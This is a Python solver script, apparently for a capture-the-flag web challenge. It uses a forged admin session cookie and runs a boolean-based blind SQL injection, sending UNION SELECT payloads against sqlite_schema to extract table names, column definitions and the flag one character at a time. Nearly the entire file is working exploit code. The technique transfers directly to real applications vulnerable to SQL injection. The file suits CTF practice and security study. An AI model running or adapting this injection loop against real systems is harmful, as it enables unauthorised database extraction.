import requests
from string import printable

url = 'http://cyberchallenge-web:9031/admin'
admin_cookie = 'eyJhZG1pbiI6InRydWUifQ.ZGt1oA.QT99Edqy_6grtK5Eh9_-ItmOQ7M'

cookies = dict(session = admin_cookie)
target_value = ""
first_chars = []
tables = []


i = 1

# Find tables
# while(1):
#     old_target_value = target_value
#     for char in printable:
#         if (char not in first_chars):

#             search = f"' UNION SELECT name FROM sqlite_schema WHERE type='table' AND name NOT LIKE 'sqlite_%' AND SUBSTRING(name,1,{i}) = '" + target_value + char + "' --"
            

#             payload = dict(search=search)

#             r = requests.post(url, cookies=cookies, data=payload)

#             if "User exists" in r.text:
#                 i += 1
#                 target_value += char
#                 break

#     if old_target_value == target_value:
#         tables.append(target_value)
#         first_chars.append(target_value[0])
#         target_value = ""
#         i = 1
#         print(tables)

# result: [flag, users]

# Find columns

columns  = []

while(1):
    old_target_value = target_value
    for char in printable:
        if (char not in first_chars):

            search = f"' UNION SELECT sql from sqlite_schema WHERE name='flag' AND SUBSTRING(sql,1,{i})='" + target_value + char + "' --"
            
            print(search)

            payload = dict(search=search)

            r = requests.post(url, cookies=cookies, data=payload)

            if "User exists" in r.text:
                i += 1
                target_value += char
                break

    if old_target_value == target_value:
        columns.append(target_value)
        first_chars.append(target_value[0])
        target_value = ""
        i = 1
        print(columns)

# result: theflag

# Find rows

rows = [] 

while(1):
    old_target_value = target_value
    for char in printable:
        if (char not in first_chars):

            search = f"' UNION SELECT theflag FROM flag WHERE SUBSTRING(theflag,1,{i})='" + target_value + char + "' --"
            

            payload = dict(search=search)

            r = requests.post(url, cookies=cookies, data=payload)

            if "User exists" in r.text:
                i += 1
                target_value += char
                break

    if old_target_value == target_value:
        rows.append(target_value)
        first_chars.append(target_value[0])
        target_value = ""
        i = 1
        print(rows)

# result: ['srdnlen{SSTI_and_blindsqli_is_an_injection_safari}']s